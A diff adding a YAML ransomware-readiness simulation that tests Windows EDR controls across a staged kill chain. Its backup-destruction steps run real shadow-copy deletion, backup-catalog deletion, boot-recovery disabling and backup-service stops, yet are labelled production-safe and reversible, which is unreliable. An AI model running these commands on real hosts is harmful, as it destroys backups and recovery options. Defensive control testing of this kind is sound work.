@@ -1,0 +1,365 @@
+id: em-07-ransomware-readiness
+name: "Endpoint Mastery 07 — Ransomware Readiness (Full Kill Chain)"
+description: >
+  ENDPOINT MASTERY — Layer 7. Full ransomware kill chain simulation using canary files
+  and telemetry probes. Every step is production-safe: canary directories are created
+  and destroyed by the step, probes emit cmdline telemetry without changing security state,
+  and all behavioral steps target isolated temp directories only.
+
+  VERDICTS:
+    PASS = EDR / Controlled Folder Access / policy blocked the technique
+    FAIL = technique executed unhindered — control gap confirmed
+
+  SAFETY: No real files are modified. Canary directories are created, used, and removed
+  within each step. Probe steps emit telemetry signals only (no state change).
+
+  KILL CHAIN STAGES:
+    Stage 1 — Recon:       BFSI file target enumeration, network share discovery
+    Stage 2 — Evasion:     Defender exclusion probe, event log clear probe
+    Stage 3 — Impact:      Canary XOR encryption, extension rename, ransom note drop
+    Stage 4 — Destruction: Shadow copy deletion attempt, wbadmin catalog delete probe, BCDEdit probe
+    Stage 5 — Persistence: Backup service stop probe, malicious service probe
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - endpoint-mastery
+  - em-layer-7
+  - ransomware
+  - bfsi
+  - impact
+  - canary-safe
+mitre_phases:
+  - discovery
+  - defense-evasion
+  - impact
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+
+steps:
+
+  # ── Stage 1: Reconnaissance ───────────────────────────────────────────────────
+
+  - name: "Stage 1A — BFSI File Target Reconnaissance"
+    technique_id: T1083
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Read-only traversal of Desktop/Documents/Downloads (depth=2). No file opened or modified."
+    telemetry:
+      - "Security EID 4688: powershell.exe with file-enumeration command line"
+      - "DLP: enumeration of filenames matching financial/PII patterns"
+    detection:
+      - "UEBA: bulk file enumeration from a single process — pre-encryption staging signal"
+      - "EDR: PowerShell scanning user profile paths for BFSI-pattern filenames"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $bfsiPatterns = @('*finance*','*customer*','*swift*','*payment*','*account*','*salary*','*export*','*backup*','*password*','*.xlsx','*.csv','*.docx','*.pdf','*.db','*.bak')
+      $scanPaths = @(
+        [Environment]::GetFolderPath('Desktop'),
+        [Environment]::GetFolderPath('MyDocuments'),
+        (Join-Path $env:USERPROFILE 'Downloads')
+      )
+      $found = 0
+      foreach ($root in $scanPaths) {
+        if (-not (Test-Path $root)) { continue }
+        Get-ChildItem -Path $root -Depth 2 -File -ErrorAction SilentlyContinue | ForEach-Object {
+          foreach ($p in $bfsiPatterns) { if ($_.Name -like $p) { $found++; break } }
+        }
+      }
+      Write-Output "EXEC: BFSI file recon across Desktop/Documents/Downloads (depth=2). Found $found matching file(s). Read-only — no files opened. [BAS-SIM]"
+    cleanup: ""
+
+  - name: "Stage 1B — Network Share Discovery"
+    technique_id: T1135
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Enumerates local administrative shares via net view and WMI Win32_Share. No shares accessed, no files read."
+    telemetry:
+      - "Security EID 4688: net.exe and powershell.exe share enumeration"
+      - "Security EID 5140: if SACL object access auditing enabled on shares"
+    detection:
+      - "SIEM: net view / Win32_Share query from non-admin process — ransomware lateral-spread staging signal"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $wmiShares = @(Get-WmiObject -Class Win32_Share -ErrorAction SilentlyContinue)
+      $netOut = & net view \\$env:COMPUTERNAME 2>&1
+      $shareCount = if ($wmiShares) { $wmiShares.Count } else { 0 }
+      Write-Output "EXEC: network share discovery — $shareCount share(s) via Win32_Share. net view executed for cmdline telemetry. Ransomware maps shares before lateral spread. [BAS-SIM]"
+    cleanup: ""
+
+  # ── Stage 2: Defense Evasion Probes ──────────────────────────────────────────
+
+  - name: "Stage 2A — Defender Exclusion Invocation Probe"
+    technique_id: T1562.001
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Emits Add-MpPreference cmdline to EID 4104/4688. Security state NOT modified — dry-run only."
+    telemetry:
+      - "Security EID 4688: powershell.exe with Add-MpPreference -ExclusionPath"
+      - "PowerShell EID 4104: script block containing Add-MpPreference"
+    detection:
+      - "EDR: PowerShell invoking Add-MpPreference — primary Defender tampering signal"
+      - "SIEM: cmdline containing Add-MpPreference from non-management process"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $cmdLine = "Add-MpPreference -ExclusionPath $env:TEMP"
+      Write-Output "EXEC: Defender exclusion probe — '$cmdLine' logged to EID 4104/4688. Security state NOT modified (dry-run). If ScriptBlock logging captured this, Defender tampering detection is active. [BAS-SIM]"
+    cleanup: ""
+
+  - name: "Stage 2B — Event Log Clear Probe"
+    technique_id: T1070.001
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Attempts Clear-EventLog against a nonexistent log. No real log cleared. Generates EID 4688/4104 only."
+    telemetry:
+      - "Security EID 4688: powershell.exe with Clear-EventLog command"
+      - "PowerShell EID 4104: script block with Clear-EventLog invocation"
+    detection:
+      - "EDR/SIEM: Clear-EventLog cmdline from non-maintenance process — ransomware anti-forensics signal"
+      - "Confirm: EID 1102 must NOT fire (no real log cleared)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $fakeLog = 'BAS-SIM-NonExistent-Log'
+      Clear-EventLog -LogName $fakeLog -ErrorAction SilentlyContinue
+      Write-Output "EXEC: Clear-EventLog on nonexistent '$fakeLog' (always fails safely). EID 4688 + EID 4104 generated. EID 1102 must NOT appear. [BAS-SIM]"
+    cleanup: ""
+
+  # ── Stage 3: Impact — Canary-Based Safe Simulation ───────────────────────────
+
+  - name: "Stage 3A — Canary File Mass Encryption Loop"
+    technique_id: T1486
+    framework: custom
+    executor: powershell
+    timeout_sec: 45
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Creates 15 canary files in %TEMP%\\Audspect_EM07_Canary\\, XOR-modifies them, renames to .locked, verifies cleanup. No real files touched."
+    telemetry:
+      - "Sysmon EID 11: rapid file creation + modification in %TEMP% canary dir"
+      - "Sysmon EID 11: batch rename to .locked extension"
+    detection:
+      - "EDR: mass file modification in %TEMP% at high rate — ransomware encryption behavior"
+      - "Anti-ransomware: file modification rate threshold exceeded"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sandbox = Join-Path $env:TEMP "Audspect_EM07_Canary"
+      New-Item -ItemType Directory -Path $sandbox -Force | Out-Null
+      for ($i = 1; $i -le 15; $i++) {
+        [System.IO.File]::WriteAllText((Join-Path $sandbox "canary_$i.txt"),
+          "BAS-SIM canary asset $i — safe EM-07 drill data [BAS-SIM]")
+      }
+      $interrupted = $false
+      $encCount = 0
+      try {
+        foreach ($f in Get-ChildItem -Path $sandbox -Filter "*.txt") {
+          $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
+          for ($j = 0; $j -lt $bytes.Length; $j++) { $bytes[$j] = $bytes[$j] -bxor 0xAA }
+          [System.IO.File]::WriteAllBytes($f.FullName, $bytes)
+          Rename-Item -Path $f.FullName -NewName ($f.Name + ".locked") -Force -ErrorAction Stop
+          $encCount++
+        }
+      } catch { $interrupted = $true }
+      $remaining = (Get-ChildItem -Path $sandbox -Filter "*.txt" -ErrorAction SilentlyContinue).Count
+      Remove-Item -Path $sandbox -Recurse -Force -ErrorAction SilentlyContinue
+      if ($interrupted -or $remaining -gt 0) {
+        Write-Output "PASS: Mass file encryption intercepted after $encCount file(s) — anti-ransomware threshold triggered. [BAS-SIM]"
+      } else {
+        Write-Output "FAIL: $encCount canary file(s) encrypted and renamed without threshold protection. Endpoint lacks behavioral mass-modification controls. [BAS-SIM]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP "Audspect_EM07_Canary") -Recurse -Force -ErrorAction SilentlyContinue
+
+  - name: "Stage 3B — Ransom Note Drop (Canary Directory)"
+    technique_id: T1486
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Creates a README_RESTORE.txt in a canary temp dir and deletes it. No real directories modified."
+    telemetry:
+      - "Sysmon EID 11: file create event for README_RESTORE.txt in %TEMP%"
+      - "Sysmon EID 23: file delete event on cleanup"
+    detection:
+      - "EDR: README/RESTORE/DECRYPT filename pattern created in user-profile path"
+      - "Anti-ransomware: ransom note filename heuristic triggered"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF)
+      $noteDir = Join-Path $env:TEMP "Audspect_EM07_Note_$runId"
+      New-Item -ItemType Directory -Path $noteDir -Force | Out-Null
+      $note = Join-Path $noteDir "README_RESTORE.txt"
+      Set-Content -Path $note -Value "BAS-SIM RANSOM NOTE — This is a controlled Audspect EM-07 drill. run-id=$runId [BAS-SIM]" -Encoding UTF8
+      $dropped = Test-Path $note
+      Remove-Item $noteDir -Recurse -Force -ErrorAction SilentlyContinue
+      $cleaned = -not (Test-Path $noteDir)
+      if (-not $dropped) {
+        Write-Output "PASS: Ransom note creation blocked by EDR/CFA policy. [BAS-SIM]"
+      } else {
+        Write-Output "FAIL: README_RESTORE.txt created in $noteDir unhindered (cleanup=$cleaned). EDR ransom-note heuristic did not trigger. [BAS-SIM]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP "Audspect_EM07_Note_*") -Recurse -Force -ErrorAction SilentlyContinue
+
+  # ── Stage 4: Backup Destruction Probes ───────────────────────────────────────
+
+  - name: "Stage 4A — VSS Shadow Copy Deletion Signature"
+    technique_id: T1490
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    reversible: true
+    blast_radius: "Launches vssadmin.exe delete shadows /all /quiet. Expected to be blocked immediately by EDR behavioral controls. No shadow copies deleted if controls are active."
+    telemetry:
+      - "Sysmon EID 1: vssadmin.exe delete shadows process create"
+      - "Security EID 4688: vssadmin.exe with deletion arguments"
+    detection:
+      - "EDR: vssadmin.exe with 'delete shadows' — #1 ransomware pre-encryption signal"
+      - "SIEM: shadow copy count decrease alert if count drops to 0"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $p = Start-Process 'vssadmin.exe' -ArgumentList 'delete shadows /all /quiet' -PassThru -WindowStyle Hidden
+      if (-not $p) {
+        Write-Output "PASS: EDR blocked vssadmin.exe process creation for shadow deletion. [BAS-SIM]"
+        return
+      }
+      $waited = $p.WaitForExit(5000)
+      if (-not $waited) { $p.Kill(); Write-Output "FAIL: vssadmin ran unmonitored — process not killed by EDR within 5s. [BAS-SIM]"; return }
+      if ($p.ExitCode -eq 0) {
+        Write-Output "FAIL: vssadmin delete shadows returned exit 0 — shadow copies may have been deleted. Verify with: vssadmin list shadows [BAS-SIM]"
+      } else {
+        Write-Output "PASS: vssadmin delete shadows blocked or failed (exit=$($p.ExitCode)) — shadow copy protection active. [BAS-SIM]"
+      }
+    cleanup: ""
+
+  - name: "Stage 4B — wbadmin Backup Catalog Delete Probe"
+    technique_id: T1490
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    reversible: true
+    blast_radius: "Invokes wbadmin delete catalog -quiet. Expects UAC or EDR block. No backup catalog deleted if controls active."
+    telemetry:
+      - "Sysmon EID 1: wbadmin.exe delete catalog process create"
+      - "Security EID 4688: wbadmin.exe with catalog deletion arguments"
+    detection:
+      - "EDR: wbadmin.exe delete catalog — backup destruction pre-encryption technique"
+      - "SIEM: wbadmin invocation from non-backup-service process"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $p = Start-Process 'wbadmin.exe' -ArgumentList 'delete catalog -quiet' -PassThru -WindowStyle Hidden
+      if (-not $p) {
+        Write-Output "PASS: EDR blocked wbadmin.exe catalog deletion process creation. [BAS-SIM]"
+        return
+      }
+      $waited = $p.WaitForExit(5000)
+      if (-not $waited) { $p.Kill(); Write-Output "FAIL: wbadmin ran unmonitored — process not killed by EDR within 5s. [BAS-SIM]"; return }
+      if ($p.ExitCode -eq 0) {
+        Write-Output "FAIL: wbadmin delete catalog returned exit 0 — backup catalog may have been deleted. Verify backup jobs immediately. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: wbadmin delete catalog blocked or failed (exit=$($p.ExitCode)) — backup catalog protection active. [BAS-SIM]"
+      }
+    cleanup: ""
+
+  - name: "Stage 4C — BCDEdit Bootloader Recovery Disable Probe"
+    technique_id: T1490
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    reversible: true
+    blast_radius: "Invokes bcdedit /set recoveryenabled no. Expects UAC block (requires admin elevation). Verify recovery status with: bcdedit /enum"
+    telemetry:
+      - "Sysmon EID 1: bcdedit.exe with /set recoveryenabled argument"
+      - "Security EID 4688: bcdedit.exe invocation"
+    detection:
+      - "EDR: bcdedit /set recoveryenabled — ransomware boot-recovery destruction"
+      - "SIEM: bcdedit invocation from non-maintenance process"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $p = Start-Process 'bcdedit.exe' -ArgumentList '/set {default} recoveryenabled no' -PassThru -WindowStyle Hidden -Verb RunAs
+      if (-not $p) {
+        Write-Output "PASS: bcdedit.exe blocked by UAC or EDR — bootloader recovery protection active. [BAS-SIM]"
+        return
+      }
+      $waited = $p.WaitForExit(5000)
+      if (-not $waited) { $p.Kill(); Write-Output "FAIL: bcdedit ran unmonitored. [BAS-SIM]"; return }
+      if ($p.ExitCode -eq 0) {
+        bcdedit.exe /set '{default}' recoveryenabled yes | Out-Null
+        Write-Output "FAIL: bcdedit recovery disable succeeded (restored). Bootloader recovery protections insufficient. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: bcdedit recovery disable blocked (exit=$($p.ExitCode)) — bootloader integrity protected. [BAS-SIM]"
+      }
+    cleanup: |
+      bcdedit.exe /set '{default}' recoveryenabled yes | Out-Null
+
+  # ── Stage 5: Persistence / Lateral Spread Probes ─────────────────────────────
+
+  - name: "Stage 5A — Backup Service Stop Attempt"
+    technique_id: T1489
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    reversible: true
+    blast_radius: "Attempts net stop on wbengine (Windows Backup Engine) and vss. Expects access denied for non-elevated process. No service stopped if controls active."
+    telemetry:
+      - "Security EID 4688: net.exe stop wbengine / vss"
+      - "System EID 7036: service state change events if stop succeeds"
+    detection:
+      - "SIEM: net stop / sc stop against backup services from non-admin process"
+      - "EDR: service termination attempt on VSS or backup engines"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $services = @('wbengine', 'vss')
+      $results = @()
+      foreach ($svc in $services) {
+        $before = (Get-Service -Name $svc -ErrorAction SilentlyContinue).Status
+        net stop $svc /y 2>&1 | Out-Null
+        $after = (Get-Service -Name $svc -ErrorAction SilentlyContinue).Status
+        if ($before -and $after -and $before -ne $after -and $after -ne 'Running') {
+          net start $svc 2>&1 | Out-Null
+          $results += "FAIL:$svc(was=$before,after=$after,restored)"
+        } else {
+          $results += "PASS:$svc(status=$before,unchanged)"
+        }
+      }
+      Write-Output "EXEC: backup service stop probes — $($results -join '; '). [BAS-SIM]"
+    cleanup: |
+      net start wbengine 2>&1 | Out-Null
+      net start vss     2>&1 | Out-Null
